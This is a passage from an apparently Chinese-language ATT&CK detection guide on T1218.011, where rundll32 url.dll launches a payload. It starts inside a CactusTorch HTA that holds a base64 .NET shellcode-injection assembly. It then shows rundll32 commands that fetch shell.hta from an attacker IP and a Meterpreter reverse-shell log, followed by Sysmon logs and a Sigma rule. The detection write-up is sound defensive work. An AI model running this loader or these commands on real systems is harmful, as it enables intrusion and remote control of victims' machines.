&amp;\"MAoABwEAAAEAABEEKBAAAAoKEgEGjmkoEQAACnMJAAAGDAgWfTUAAARyAQAAcBMEcgMAAHAoEgAA\"\ns = s &amp;\"Cm8TAAAKFjEZch0AAHAoEgAACnIrAABwAygUAAAKEwQrF3IdAABwKBIAAApyQQAAcAMoFAAAChME\"\ns = s &amp;\"EQQUFBQXGn4VAAAKFAgSAygBAAAGJgl7BAAABBMFEgUoFgAACnJXAABwKBcAAAosbhEFFnMRAAAK\"\ns = s &amp;\"ByAAMAAAH0AoAgAABhMGEgYoFgAACnJXAABwKBgAAAosChEFFigEAAAGJioWEwcSCAaOaSgRAAAK\"\ns = s &amp;\"EQURBgYRCBEHKAMAAAYmEQUWcxEAAAoWEQYWcxEAAAoWFnMRAAAKKAUAAAYmKnoCfhUAAAp9AgAA\"\ns = s &amp;\"BAIoDwAACgICKBkAAAp9AQAABCoAABMwAgBgAAAAAAAAAAJ+FQAACn0rAAAEAn4VAAAKfSwAAAQC\"\ns = s &amp;\"fhUAAAp9LQAABAJ+FQAACn04AAAEAn4VAAAKfTkAAAQCfhUAAAp9OgAABAJ+FQAACn07AAAEAigP\"\ns = s &amp;\"AAAKAgIoGQAACn0qAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAACgHAAAj\"\ns = s &amp;\"fgAAlAcAAEwJAAAjU3RyaW5ncwAAAADgEAAAXAAAACNVUwA8EQAAEAAAACNHVUlEAAAATBEAANwB\"\ns = s &amp;\"AAAjQmxvYgAAAAAAAAACAAABVx0CFAkCAAAA+gEzABYAAAEAAAAXAAAACQAAAFAAAAAJAAAAHwAA\"\ns = s &amp;\"ABkAAAAzAAAAEgAAAAEAAAABAAAABQAAAAEAAAABAAAABwAAAAAAmQYBAAAAAAAGAFwFkgcGAMkF\"\ns = s &amp;\"kgcGAIoEYAcPALIHAAAGALIE4QYGADAF4QYGABEF4QYGALAF4QYGAHwF4QYGAJUF4QYGAMkE4QYG\"\ns = s &amp;\"AJ4EcwcGAHwEcwcGAPQE4QYGAKsIqQYGAGEEqQYGAE0FqQYGALAGqQYGAMoIqQYGAFkHqQYGAL4I\"\ns = s &amp;\"qQYGAGYGqQYGAIQGcwcAAAAAJQAAAAAAAQABAAEAEABtBgAAPQABAAEACgAQAPgHAAA9AAEACAAK\"\ns = s &amp;\"ARAAzgYAAEEABAAJAAIBAAAbCAAASQAIAAkAAgEAADYIAABJACcACQAKABAABgcAAD0AKgAJAAIB\"\ns = s &amp;\"AABtBAAASQA8AAoAAgEAAPMGAABJAEUACgAGAH0G+gAGAEQHPwAGACQE/QAGAHQIPwAGAOcDPwAG\"\ns = s &amp;\"AMgD+gAGAL0D+gAGBp4DAAFWgLICAwFWgMACAwFWgGQAAwFWgIgCAwFWgMIAAwFWgFMCAwFWgPEB\"\ns = s &amp;\"AwFWgB0CAwFWgAUCAwFWgKABAwFWgAIDAwFWgF4BAwFWgEgBAwFWgOEBAwFWgE0CAwFWgDECAwFW\"\ns = s &amp;\"gGoDAwFWgIIDAwFWgJkCAwFWgB0DAwFWgHYBAwFWgHUAAwFWgD0AAwFWgCcBAwFWgKgAAwFWgDoD\"\ns = s &amp;\"AwFWgLkBAwFWgBgBAwFWgMYBAwFWgOUCAwEGBp4DAAFWgJEABwFWgHICBwEGAKYD+gAGAO8DPwAG\"\ns = s &amp;\"ABcHPwAGADMEPwAGAEsD+gAGAJoD+gAGAOcF+gAGAO8F+gAGAEcI+gAGAFUI+gAGAOQE+gAGAC4I\"\ns = s &amp;\"+gAGAOcICwEGAA0ACwEGABkAPwAGANIIPwAGANwIPwAGADQHPwAGBp4DAAFWgN4CDgFWgO8ADgFW\"\ns = s &amp;\"gJ0BDgFWgNgCDgFWgNUBDgFWgA8BDgFWgJQBDgFWgAMBDgEGBp4DAAFWgOcAEgFWgFcAEgFWgNUA\"\ns = s &amp;\"EgFWgFgDEgFWgGkCEgFWgE8DEgFWgN0AEgFWgGADEgFWgBEGEgFWgCQGEgFWgDkGEgEAAAAAgACW\"\ns = s &amp;\"IC4AFgEBAAAAAACAAJYg8wgqAQsAAAAAAIAAliAJCTUBEAAAAAAAgACWIGMIPwEVAAAAAACAAJEg\"\ns = s &amp;\"1ANFARcAUCAAAAAAhhg+BwYAHgBYIAAAAACGAE0EUAEeAGshAAAAAIYYPgcGACAAjCEAAAAAhhg+\"\ns = s &amp;\"BwYAIAAAAAEAOwQAAAIAUwQAAAMA5AcAAAQA0QcAAAUAwQcAAAYACwgAAAcAvAgAAAgAHAkBAAkA\"\ns = s &amp;\"BAcCAAoAzAYAAAEAGwQAAAIAiwgAAAMAAwYAAAQAawQAAAUAsggAAAEAdAgAAAIAfQgAAAMAIQcA\"\ns = s &amp;\"AAQAAwYAAAUAtQYAAAEAdAgAAAIA+gMAAAEAdAgAAAIA0QcAAAMA9wUAAAQAlQgAAAUAKAcAAAYA\"\ns = s &amp;\"CwgAAAcAsgMAAAEAAgkAAAIAAQAJAD4HAQARAD4HBgAZAD4HCgApAD4HEAAxAD4HEAA5AD4HEABB\"\ns = s &amp;\"AD4HEABJAD4HEABRAD4HEABZAD4HEABhAD4HFQBpAD4HEABxAD4HEACJAD4HBgB5AD4HBgCZAFMG\"\ns = s &amp;\"KQChAD4HAQCpAAQELwCxAHkGNACxAKQIOAChABIHPwChAGQGQgCxADsJRgCxAC8JRgC5AAoGTAAJ\"\ns = s &amp;\"ACQAWgAJACgAXwAJACwAZAAJADAAaQAJADQAbgAJADgAcwAJADwAeAAJAEAAfQAJAEQAggAJAEgA\"\ns = s &amp;\"hwAJAEwAjAAJAFAAkQAJAFQAlgAJAFgAmwAJAFwAoAAJAGAApQAJAGQAqgAJAGgArwAJAGwAtAAJ\"\ns = s &amp;\"AHAAuQAJAHQAvgAJAHgAwwAJAHwAyAAJAIAAzQAJAIQA0gAJAIgA1wAJAIwA3AAJAJAA4QAJAJQA\"\ns = s &amp;\"5gAJAJgA6wAJAKAAWgAJAKQAXwAJAPQAlgAJAPgAmwAJAPwA8AAJAAABuQAJAAQB4QAJAAgB9QAJ\"\ns = s &amp;\"AAwBvgAJABABwwAJABgBbgAJABwBcwAJACABeAAJACQBfQAJACgBWgAJACwBXwAJADABZAAJADQB\"\ns = s &amp;\"aQAJADgBggAJADwBhwAJAEABjAAuAAsAVgEuABMAXwEuABsAfgEuACMAhwEuACsAhwEuADMAmAEu\"\ns = s &amp;\"ADsAmAEuAEMAhwEuAEsAhwEuAFMAmAEuAFsAngEuAGMApAEuAGsAzgFDAFsAngGjAHMAWgDDAHMA\"\ns = s &amp;\"WgADAXMAWgAjAXMAWgAaAIwGAAEDAC4AAQAAAQUA8wgBAAABBwAJCQEAAAEJAGMIAQAAAQsA1AMB\"\ns = s &amp;\"AASAAAABAAAAAAAAAAAAAAAAAPcAAAACAAAAAAAAAAAAAABRAKkDAAAAAAMAAgAEAAIABQACAAYA\"\ns = s &amp;\"AgAHAAIACAACAAkAAgAAAAAAAHNoZWxsY29kZTMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADxN\"\ns = s &amp;\"b2R1bGU+AENyZWF0ZVByb2Nlc3NBAENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IARVhFQ1VURV9S\"\ns = s &amp;\"RUFEAENSRUFURV9TVVNQRU5ERUQAUFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAERVUExJQ0FU\"\ns = s &amp;\"RV9DTE9TRV9TT1VSQ0UAQ1JFQVRFX0RFRkFVTFRfRVJST1JfTU9ERQBDUkVBVEVfTkVXX0NPTlNP\"\ns = s &amp;\"TEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAENBQ1RVU1RPUkNIAFdSSVRFX1dB\"\ns = s &amp;\"VENIAFBIWVNJQ0FMAFBST0ZJTEVfS0VSTkVMAENSRUFURV9QUkVTRVJWRV9DT0RFX0FVVEhaX0xF\"\ns = s &amp;\"VkVMAENSRUFURV9TSEFSRURfV09XX1ZETQBDUkVBVEVfU0VQQVJBVEVfV09XX1ZETQBQUk9DRVNT\"\ns = s &amp;\"X01PREVfQkFDS0dST1VORF9CRUdJTgBUT1BfRE9XTgBHTwBDUkVBVEVfTkVXX1BST0NFU1NfR1JP\"\ns = s &amp;\"VVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAExBUkdFX1BBR0VTAENSRUFURV9GT1JDRURP\"\ns = s &amp;\"UwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNTAEhJR0hfUFJJT1JJ\"\ns = s &amp;\"VFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05PUk1BTF9QUklPUklU\"\ns = s &amp;\"WV9DTEFTUwBOT0FDQ0VTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAREVUQUNIRURfUFJPQ0VTUwBD\"\ns = s &amp;\"UkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdfUFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJP\"\ns = s &amp;\"Q0VTUwBSRVNFVABDT01NSVQAQ1JFQVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5J\"\ns = s &amp;\"Q09ERV9FTlZJUk9OTUVOVABFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAENSRUFURV9OT19X\"\ns = s &amp;\"SU5ET1cAZHdYAFJFQURPTkxZAEVYRUNVVEVfV1JJVEVDT1BZAElOSEVSSVRfUEFSRU5UX0FGRklO\"\ns = s &amp;\"SVRZAElOSEVSSVRfQ0FMTEVSX1BSSU9SSVRZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGxwVGhy\"\ns = s &amp;\"ZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAaFRocmVhZABs\"\ns = s &amp;\"cFJlc2VydmVkAHVFeGl0Q29kZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGxwSGFuZGxlAGJJbmhl\"\ns = s &amp;\"cml0SGFuZGxlAGxwVGl0bGUAbHBBcHBsaWNhdGlvbk5hbWUAZmxhbWUAbHBDb21tYW5kTGluZQBW\"\ns = s &amp;\"YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1\"\ns = s &amp;\"dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJh\"\ns = s &amp;\"ZGVtYXJrQXR0cmlidXRlAGR3RmlsbEF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmli\"\ns = s &amp;\"dXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0\"\ns = s &amp;\"cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNz\"\ns = s &amp;\"ZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5\"\ns = s &amp;\"Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1hTaXplAGR3\"\ns = s &amp;\"WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNI\"\ns = s &amp;\"RV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBGcm9tQmFzZTY0U3RyaW5n\"\ns = s &amp;\"AFRvU3RyaW5nAGNhY3R1c1RvcmNoAGdldF9MZW5ndGgATWFyc2hhbABrZXJuZWwzMi5kbGwAQ0FD\"\ns = s &amp;\"VFVTVE9SQ0guZGxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AbHBQcm9jZXNz\"\ns = s &amp;\"SW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscFN0YXJ0dXBJ\"\ns = s &amp;\"bmZvAFplcm8AbHBEZXNrdG9wAGJ1ZmZlcgBscFBhcmFtZXRlcgBoU3RkRXJyb3IALmN0b3IAbHBT\"\ns = s &amp;\"ZWN1cml0eURlc2NyaXB0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGlt\"\ns = s &amp;\"ZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp\"\ns = s &amp;\"bmdNb2RlcwBiSW5oZXJpdEhhbmRsZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwUHJvY2Vzc0F0dHJp\"\ns = s &amp;\"YnV0ZXMAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBDcmVhdGVQcm9jZXNzRmxh\"\ns = s &amp;\"Z3MAZHdGbGFncwBEdXBsaWNhdGVPcHRpb25zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBU\"\ns = s &amp;\"ZXJtaW5hdGVQcm9jZXNzAGhQcm9jZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRB\"\ns = s &amp;\"ZGRyZXNzAENvbmNhdABPYmplY3QAZmxQcm90ZWN0AGxwRW52aXJvbm1lbnQAQ29udmVydABoU3Rk\"\ns = s &amp;\"SW5wdXQAaFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBWaXJ0dWFsQWxsb2NFeABiaW5hcnkAV3JpdGVQ\"\ns = s &amp;\"cm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5\"\ns = s &amp;\"AAAAAAABABlQAHIAbwBnAHIAYQBtAFcANgA0ADMAMgAADXcAaQBuAGQAaQByAAAVXABTAHkAcwBX\"\ns = s &amp;\"AE8AVwA2ADQAXAAAFVwAUwB5AHMAdABlAG0AMwAyAFwAAAMwAAAARY+bzuLqxE+aSSAzLsphXgAE\"\ns = s &amp;\"IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcJHQUYEhwREA4YGAgYBQABHQUOBAABDg4DIAAIBgAD\"\ns = s &amp;\"Dg4ODgIGGAMgAA4FAAICDg4EAAEIHAi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAAAAAE\"\ns = s &amp;\"IAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAABAAA\"\ns = s &amp;\"AQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQAAAAg\"\ns = s &amp;\"BAAAAEAEAAAAgAQAMAAABAAAQAACBggCBgICBgkDBhEUAwYRGAIGBgMGESADBhEkEwAKGA4OEgwS\"\ns = s &amp;\"DAIRFBgOEhwQERAKAAUYGBgYESARJAkABQIYGB0FGAgFAAICGAkKAAcYGBgJGBgJGAUgAgEODggB\"\ns = s &amp;\"AAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAQAQALQ0FDVFVT\"\ns = s &amp;\"VE9SQ0gAAAUBAAAAAAUBAAEAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3\"\ns = s &amp;\"NzcAAAwBAAcxLjAuMC4wAAAASDUAAAAAAAAAAAAAYjUAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AFQ1AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA\"\ns = s &amp;\"ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAANAMAAAAAAAAAAAAANAM0AAAAVgBTAF8A\"\ns = s &amp;\"VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA\"\ns = s &amp;\"AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA\"\ns = s &amp;\"BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJQCAAABAFMAdAByAGkAbgBnAEYAaQBs\"\ns = s &amp;\"AGUASQBuAGYAbwAAAHACAAABADAAMAAwADAAMAA0AGIAMAAAADAADAABAEMAbwBtAG0AZQBuAHQA\"\ns = s &amp;\"cwAAAEMAQQBDAFQAVQBTAFQATwBSAEMASAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA\"\ns = s &amp;\"AAAAAAAAAEAADAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAEEAQwBUAFUA\"\ns = s &amp;\"UwBUAE8AUgBDAEgAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu\"\ns = s &amp;\"ADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAQQBDAFQAVQBTAFQATwBSAEMA\"\ns = s &amp;\"SAAuAGQAbABsAAAAPAAMAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBBAEMAVABV\"\ns = s &amp;\"AFMAVABPAFIAQwBIAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA\"\ns = s &amp;\"AABIABAAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQwBBAEMAVABVAFMAVABP\"\ns = s &amp;\"AFIAQwBIAC4AZABsAGwAAAA4AAwAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEMAQQBDAFQA\"\ns = s &amp;\"VQBTAFQATwBSAEMASAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAw\"\ns = s &amp;\"AC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAA\"\ns = s &amp;\"LgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAADAAAAwAAAB0NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv\"\ns = s &amp;\"bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA\"\n\nentry_class =\"cactusTorch\"\nDim fmt, al, d, o\nSet fmt = CreateObject(\"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter\")\nSet al = CreateObject(\"System.Collections.ArrayList\")\nal.Add fmt.SurrogateSelector\n\nSet d = fmt.Deserialize_2(Base64ToStream(s))\nSet o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)\no.flame binary,code\nEnd Sub\n\nSetVersion\nOn Error Resume Next\nRun\nIf Err.Number &lt;&gt;0 Then\nDebug Err.Description\nErr.Clear\nEnd If\nself.close\n&lt;/script&gt;\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\u6216\u8005\u672c\u5730","text":"<pre><code>\u672c\u5730\u6267\u884c\nrundll32.exe url.dll,FileProtocolHandler file://C:\\Users\\John\\Desktop\\shell.hta\n\n\u540c\u6837\u53ef\u4ee5\u8c03\u7528url.dll\u4e0b\u8f7dpayload\uff1a\nrundll32.exe url.dll,OpenURL http://192.168.126.146/shell.hta #\u4f1a\u6709\u5f39\u7a97\u63d0\u793a\u786e\u8ba4\u8fd0\u884c\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>msf5 exploit(multi/handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.126.146:4444\n[*] Sending stage (180291 bytes) to 192.168.126.149\n[*] Meterpreter session 2 opened (192.168.126.146:4444 -&gt; 192.168.126.149:49187) at 2020-04-18 23:48:35 +0800\n\nmeterpreter &gt; getuid\nServer username: 12306Br0-PC\\12306Br0\nmeterpreter &gt; getsid\nServer SID: S-1-5-21-3579006141-3881886638-2121494774-1000\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>sysmon\u65e5\u5fd7\u8bb0\u5f55</p> <pre><code>EVentID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 15:48:25.994\nProcessGuid: {bb1f7c32-2149-5e9b-0000-00107066a000}\nProcessId: 2900\nImage: C:\\Windows\\System32\\rundll32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows host process (Rundll32)\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: RUNDLL32.EXE\nCommandLine: rundll32.exe  url.dll,OpenURL http://192.168.126.146/shell.hta\nCurrentDirectory: C:\\Users\\12306Br0\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\nLogonId: 0x6e21a\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=963B55ACC8C566876364716D5AAFA353995812A8\nParentProcessGuid: {bb1f7c32-20fc-5e9b-0000-0010bd868700}\nParentProcessId: 3808\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\"\n</code></pre> <p>win7\u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55</p> <pre><code>EVentID: 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0xa30\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\rundll32.exe\n\nEVentID: 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0xd04\n\u65b0\u8fdb\u7a0b\u540d: C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\n\nEVentID: 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0x8f8\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\mshta.exe\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Suspicious Rundll32 Activity\n\ndescription: Detects suspicious process related to rundll32 based on arguments\nstatus: experimental\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218_11\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\rundll32.exe* url.dll,*OpenURL *'\n            - '*\\rundll32.exe* url.dll,*OpenURLA *'\n            - '*\\rundll32.exe* url.dll,*FileProtocolHandler *'\n            - '*\\rundll32.exe* zipfldr.dll,*RouteTheCall *'\n            - '*\\rundll32.exe* Shell32.dll,*Control_RunDLL *'\n            - '*\\rundll32.exe javascript:*'\n            - '* url.dll,*OpenURL *'  #\u9002\u5408\u672c\u6b21\u6848\u4f8b\u7684\u68c0\u6d4b\u7279\u5f81\n            - '* url.dll,*OpenURLA *'\n            - '* url.dll,*FileProtocolHandler *'\n            - '* zipfldr.dll,*RouteTheCall *'\n            - '* Shell32.dll,*Control_RunDLL *'\n            - '* javascript:*'\n            - '*.RegisterXLL*'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_9","title":"\u5efa\u8bae","text":"<p>\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790rundll32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83rundll32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728rundll32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_10","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1218-011</p> <p>https://attack.mitre.org/techniques/T1218/011/</p> <p>windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0a\uff09</p> 